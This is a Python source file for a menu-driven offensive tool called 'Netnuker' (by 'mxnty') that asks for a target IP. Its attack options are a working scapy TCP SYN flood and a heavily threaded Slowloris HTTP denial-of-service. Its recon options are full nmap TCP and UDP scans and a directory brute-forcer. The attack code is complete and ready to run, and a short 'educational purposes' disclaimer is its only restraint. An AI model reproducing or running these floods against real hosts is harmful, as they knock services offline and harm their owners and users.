#!/usr/bin/python3
import colorama
from colorama import Style, Fore
from threading import Thread, Lock, Event
import queue
import requests
import sys
import os
import socket
from datetime import datetime
import random
from scapy.all import *
from urllib.parse import urlparse
import subprocess  # Make sure to import subprocess for the ping function
import time  # Import time module for sleep and duration

# Grab IP of current user

def get_current_ip():
    hostname = socket.gethostname()
    current_ip = socket.gethostbyname(hostname)
    return current_ip

currentIP = get_current_ip()

# Intro

colorama.init(autoreset=True)

intro = f"""{Fore.RED}{Style.BRIGHT}
 ███▄    █ ▓█████▄▄▄█████▓ ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
 ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒ ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
▒██░   ▓██░░▒████▒ ▒██▒ ░ ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░░   ░ ▒░ ░ ░  ░   ░    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
   ░   ░ ░    ░    ░         ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
         ░    ░  ░                 ░    ░     ░  ░      ░  ░   ░                                                                      
{Fore.MAGENTA}
  /\      {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}made by mxnty{Fore.MAGENTA} <<<
 /  \\     {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}version: 1.2{Fore.MAGENTA} <<<
 |  |     {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}time of start: {datetime.now()}{Fore.MAGENTA} <<<
 |  |     {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}time awake: too long{Fore.MAGENTA} <<<
/ == \\    {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}hacked: all the things{Fore.MAGENTA} <<<
|/**\\|     {Fore.MAGENTA}>>> {Fore.LIGHTCYAN_EX}your ip: {currentIP}{Fore.MAGENTA} <<<
{Fore.GREEN}++++++++++++++++++++++++++++++++++++++++++++
"""
print(intro)

# Check if the host is up

target_ip = input(f"{Fore.RED}[+] Enter the target IP address: ")
print(f"{Fore.RED}[+] Checking if the host is up...")

def ping_host(ip):
    try:
        output = subprocess.check_output(
            ["ping", "-c", "1", ip],
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        return True
    except subprocess.CalledProcessError:
        return False

if ping_host(target_ip):
    print(f"{Fore.RED}[+] STATUS: Host {target_ip} is up!")
else:
    print(f"{Fore.LIGHTRED_EX}[-] ERROR: Host {target_ip} is down!")
    sys.exit()

# Define options

option = input(f"""{Fore.LIGHTYELLOW_EX}{Style.BRIGHT}
               
**DISCLAIMER**
This tool is intended for educational purposes only and should only be used on networks and systems for which you have explicit permission to conduct security testing. Unauthorized use of this tool is illegal and unethical, and can result in severe legal consequences.
{Fore.RED}      
Attacks:
  _______________________________
 /                               |
| 1. TCP Syn Flood Attack (DoS)   |
 \_______________________________/
  _________________________ __________
 /                                    |
| 2. Slowloris Attack (HTTP, Effective)|
 \_____________________________________/    
         
{Fore.YELLOW}++++++++++++++++++++++++++++++++++
{Fore.RED}
Recon:
  __________________________________
 /                                  |
| 3. Nmap Scan (-sC -sV -p- --open)  |
 \__________________________________/
  _______________________________________
 /                                       |
| 4. subdestroyer Scan For Subdirectories |
 \_______________________________________/
  _______________________________________
 /                                       |
| 5. Nmap Scan For Most Popular UDP Ports |
 \_______________________________________/

Your option: """)

if option == '1':
    target_port = int(input(f"{Fore.RED}Enter target port: {Fore.RESET}"))
    duration = 60  # Duration set to 60 seconds

    # Function to generate a random source port
    def random_port():
        port = random.randint(1024, 65535)
        return port

    # Function to send a SYN flood
    def syn_flood(target_ip, target_port, duration):
        ip = IP(dst=target_ip)  # Create an IP packet template with the target IP
        tcp = TCP(dport=target_port, flags='S')  # Create a TCP packet template with the target port and SYN flag

        end_time = time.time() + duration
        while time.time() < end_time:
            tcp.sport = random_port()  # Spoof the source port
            pkt = ip/tcp  # Combine the IP and TCP packets
            send(pkt, verbose=False)  # Send the packet without verbose output
            time.sleep(0.01)  # Throttle the attack

    print(f"{Fore.GREEN}Starting SYN flood on {target_ip}:{target_port} for {duration} seconds{Fore.RESET}")
    syn_flood(target_ip, target_port, duration)

elif option == '2':
    target_url = input(f"{Fore.RED}Enter target URL (e.g., http://192.168.0.10): {Fore.RESET}")
    duration = int(input(f"{Fore.RED}Enter duration in seconds: {Fore.RESET}"))

    # Slowloris Attack
    def slowloris_attack(target_url, duration):
        if not target_url.startswith('http://') and not target_url.startswith('https://'):
            target_url = 'http://' + target_url
        parsed_url = urlparse(target_url)
        target_host = parsed_url.hostname
        target_port = 80 if parsed_url.port is None else parsed_url.port
        
        connections = []
        timeout = time.time() + duration

        while time.time() < timeout:
            try:
                while len(connections) < 1000:  # Increase the number of connections
                    try:
                        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        conn.settimeout(4)
                        conn.connect((target_host, target_port))
                        conn.send("GET / HTTP/1.1\r\n".encode('utf-8'))
                        conn.send(f"Host: {target_host}\r\n".encode('utf-8'))
                        conn.send("User-Agent: Mozilla/5.0\r\n".encode('utf-8'))
                        conn.send("Content-Length: 42\r\n".encode('utf-8'))
                        connections.append(conn)
                        print(Fore.YELLOW + f"Slowloris connection established to {target_url}")
                    except socket.error as e:
                        print(Fore.RED + f"Error establishing connection: {e}")
                
                for conn in connections:
                    try:
                        conn.send("X-a: b\r\n".encode('utf-8'))
                    except socket.error:
                        connections.remove(conn)
                
                time.sleep(0.1)  # Reduce sleep time to increase frequency
            except socket.timeout:
                print(Fore.RED + f"Connection timed out, web server might be down!")
            except socket.error as e:
                print(Fore.RED + f"Error: {e}")

    def start_slowloris_attack(target_url, duration):
        threads = []
        for _ in range(100):  # Increased number of threads for higher intensity
            thread = Thread(target=slowloris_attack, args=(target_url, duration))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    print(f"{Fore.GREEN}Starting Slowloris attack on {target_url} for {duration} seconds{Fore.RESET}")
    start_slowloris_attack(target_url, duration)

elif option == '3':
    os.system(f"nmap -sC -sV -p- --open -v {target_ip}")
    sys.exit(1)
elif option == '4':
    banner = """
                __        __          __                            
    _______  __/ /_  ____/ /__  _____/ /__________  __  _____  _____
    / ___/ / / / __ \/ __  / _ \/ ___/ __/ ___/ __ \/ / / / _ \/ ___/
    (__  ) /_/ / /_/ / /_/ /  __(__  ) /_/ /  / /_/ / /_/ /  __/ /    
    /____/\__,_/_.___/\__,_/\___/____/\__/_/   \____/\__, /\___/_/     
                                                    /____/             
    by mxnty
    """

    print(f"{Fore.RED}{banner}")

    currentTime = datetime.now()

    colorama.init()
    target = f'http://{target_ip}'
    target_url = target.rstrip('/')  # Ensure no trailing slash
    wordlist = '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt'

    def count_lines(filename):
        try:
            with open(filename, 'r') as file:
                return sum(1 for line in file)
        except FileNotFoundError:
            print(f"{Fore.RED}[-] ERROR: Wordlist file not found!")
            sys.exit(1)

    wordlistSize = count_lines(wordlist)

    # User agent variables
    randomUserAgent = input(f"{Fore.BLUE}Do you wanna use random user agents (yes/no): ").strip().lower()
    defaultUserAgent = 'subdestroyer v1.0'
    user_agents = []

    if randomUserAgent == 'yes':
        userAgentPath = input(f'{Fore.BLUE}Enter the path to the wordlist of user agents: ')
        try:
            with open(userAgentPath, 'r') as useragents_file:
                for line in useragents_file:
                    user_agents.append(line.strip())
        except FileNotFoundError:
            print(f"{Fore.RED}[-] ERROR: User agent wordlist file not found!")
            sys.exit(1)

    # Load wordlist
    subdirectories = queue.Queue()

    try:
        with open(wordlist, 'r') as file:
            for line in file:
                subdirectories.put(line.strip())
    except FileNotFoundError:
        print(f"{Fore.RED}[-] ERROR: Wordlist file not found!")
        sys.exit(1)

    # Define worker function
    lock = Lock()
    stop_event = Event()

    def test_subdirectory():
        while not subdirectories.empty() and not stop_event.is_set():
            subdirectory = subdirectories.get()
            url = f"{target_url}/{subdirectory}"
            
            if randomUserAgent == 'yes':
                headers = {"User-Agent": random.choice(user_agents)}
            else:
                headers = {"User-Agent": defaultUserAgent}

            try:
                response = requests.head(url, headers=headers)  # Use HEAD request to reduce bandwidth usage
                if response.status_code in [200, 301, 302, 403]:  # Common valid response codes
                    with lock:
                        print(f"{Fore.GREEN}[+] INFO: Found subdirectory: {url} [Status code: {response.status_code}]")
            except requests.ConnectionError:
                pass
            finally:
                subdirectories.task_done()

    # Multi-threading
    num_threads = 1  # Change here to add threads
    threads = []

    print(f"""
    {Fore.YELLOW}[+] STATUS:
    [🔎] Scan started at {currentTime}
    [📜] Wordlist size: {wordlistSize}
    [🧵] Threads: {num_threads}
    [🕵️] Random User-Agent: {randomUserAgent}
    """)

    try:
        for _ in range(num_threads):
            thread = Thread(target=test_subdirectory)
            thread.start()
            threads.append(thread)

        # Wait for the queues to be empty
        subdirectories.join()

    except KeyboardInterrupt:
        print(f"{Fore.RED}[+] ERROR: Scan interrupted by user.")
        stop_event.set()
    finally:
        for thread in threads:
            thread.join()

    print(f"{Fore.YELLOW}[+] STATUS: Scan completed at {currentTime}")

    colorama.deinit()
elif option == '5':
    os.system(f"nmap -v -sU --top-ports 100 {target_ip}")
else:
    print(f"{Fore.LIGHTRED_EX}[-] Invalid Option!")
    sys.exit()
